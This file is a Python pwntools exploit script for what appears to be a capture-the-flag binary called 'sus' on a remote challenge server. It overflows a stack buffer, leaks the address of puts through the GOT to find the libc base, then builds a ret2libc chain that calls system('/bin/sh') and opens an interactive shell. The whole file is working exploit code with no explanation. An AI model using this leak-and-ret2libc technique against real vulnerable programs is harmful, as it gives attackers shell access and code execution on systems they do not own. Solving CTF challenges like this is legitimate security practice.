import pwn
pwn.context.log_level="DEBUG"
e = pwn.ELF('./sus')
io = pwn.remote('chall.lac.tf', 31284)
# io: pwn.tubes.tube.tube = pwn.gdb.debug(
#     "./sus", "b *0x4011a2", env={"LD_PRELOAD": ""}
# )
libc = pwn.ELF('./libc.so.6')
ld = pwn.ELF('./ld-linux-x86-64.so.2')

payload = b''

io.recvuntil(b'sus?\n')

offset = 0x38
payload += b'A' * offset
payload += pwn.p64(e.got['puts']) # rdi
payload += pwn.p64(1)
payload += pwn.p64(e.plt['puts'])
payload += pwn.p64(e.sym['main'])
io.sendline(payload)

tmp = io.recv(6)
leak = pwn.u64(tmp.ljust(8, b"\x00"))

io.recvuntil(b'sus?\n')
libc_base = leak - libc.sym['puts']

binsh = next(libc.search(b'/bin/sh\x00')) + libc_base
sys = libc.symbols['system'] + libc_base
rop = pwn.ROP(libc)

payload = b''
payload += b'A' * offset
payload += pwn.p64(binsh) # rdi
payload += pwn.p64(1)
payload += pwn.p64(rop.find_gadget(['ret']).address + libc_base)
payload += pwn.p64(sys)
io.sendline(payload)
io.interactive()
